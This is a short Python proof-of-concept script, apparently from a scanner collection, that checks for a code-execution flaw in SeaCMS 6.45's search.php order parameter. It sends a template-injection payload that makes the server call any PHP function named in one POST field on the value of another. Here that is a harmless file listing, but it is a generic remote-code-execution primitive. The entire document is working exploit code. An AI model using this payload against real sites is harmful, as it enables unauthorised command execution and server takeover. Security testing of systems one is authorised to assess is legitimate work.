#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms 6.45 search.php order参数前台代码执行
referer: unknown
author: Lucifer
description: 文件/search.php中,post参数order存在代码执行漏洞。
'''
import sys
import json
import requests



class seacms_order_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/search.php?searchtype=5"
        post_data = {
            "searchword":"d",
            "order":"}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}", 
            "func":"glob",
            "cmd":"comment.php"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"comment.php" in req.text:
                return "[+]存在seacms 6.45 search.php order参数前台代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = seacms_order_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()
